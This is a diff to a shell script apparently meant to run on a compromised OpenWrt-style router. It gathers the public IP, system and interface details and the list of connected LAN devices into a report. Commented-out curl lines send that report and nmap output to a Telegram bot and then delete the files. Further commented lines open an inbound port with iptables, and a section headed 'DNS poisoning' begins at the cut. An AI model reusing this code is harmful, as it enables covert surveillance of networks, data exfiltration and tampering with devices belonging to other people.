@@ -3,13 +3,13 @@
 current_date=$(date "+%d-%m-%Y")
 wget -q --spider http://google.com
 if [ $? -eq 0 ]; then
-    # Send report via telegram
+    # Telegram bot info
     token=""
     chat_id=""
 
     echo "Internet ok"
 
-    echo "Check space available"
+    echo "Check space available..."
     # Get memory in KiB
     mem=$(df -k | awk '$NF=="/overlay"{print $4}')
     # Remove characters
@@ -17,11 +17,44 @@ if [ $? -eq 0 ]; then
     # Convert KiB to MB 
     mem_mb=$(expr $mem_kb / 1024)
     # Check if the value is less than 5
+
+
     if [ "$mem_mb" -lt 5 ]; then
         echo "Available memory less than 5MB"
         echo "    - Nmap will not be installed"
+        #opkg update
+        #opkg install openssh-sftp-server #51.21 KiB KiB
+        #opkg install libmbedtls #217.33 KiB
+        #opkg install curl #57.56 KiB
+        #opkg install ip-tiny #119.81 KiB
+        #opkg install tcpdump #281.03 KiB  
+        echo "Dependencies ok"
+
+        public_ip=$(curl -s https://ifconfig.me/ip)
+
+        echo "Create Report..."
+        # Create file report
+        report="report_$public_ip.txt"
+        touch $report
+        # Get and Save system info
+        uname -a >> $report 
+        # Get and Save public ip
+        echo "Public Ip:" $public_ip >> $report 
+        echo >> $report
+        # Get and Save interface info
+        ifconfig >> $report 
+        # Get and Save devices connected
+        ip neigh | awk '{print "Ip: "$1 "\n Interface: "$3 "\n Mac: "$5 "\n Route: "$6 "\n" }' >> $report
+        echo "Task complete"
+
+        echo "Send Report..."
+        #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Report: $public_ip"
+        #curl -F chat_id="$chat_id" -F document=@"$report" "https://api.telegram.org/bot$token/sendDocument"
+        #rm "$report"
         exit 1
-    fi    
+    fi 
+
+
     echo "Available memory more than 5MB"
     echo "    - Nmap will be installed"
 
@@ -50,16 +83,22 @@ if [ $? -eq 0 ]; then
     system_info=$(uname -a)
 
     # Get ifconfig result
-    ifconfig_output_file="ifconfig_$current_date.txt"
+    ifconfig_output_file="ifconfig_$public_ip.txt"
     touch $ifconfig_output_file
     ifconfig > $ifconfig_output_file
 
-    # Port forwarding
+    #Send report
     #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
     #curl -F chat_id="$chat_id" -F document=@"$nmap_output_file" "https://api.telegram.org/bot$token/sendDocument"
     #curl -F chat_id="$chat_id" -F document=@"$ifconfig_output_file" "https://api.telegram.org/bot$token/sendDocument"
     #rm "$nmap_output_file"
     #rm "$ifconfig_output_file"
+
+    #Port forwarding
+    #f_port=3000
+    #echo "Enabling portforwarding on port $f_port..."
+    #iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
+    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info %0APort forwading enabled: $public_ip":"$f_port"        
 
     # DNS poisoning
     #domain="example.com"
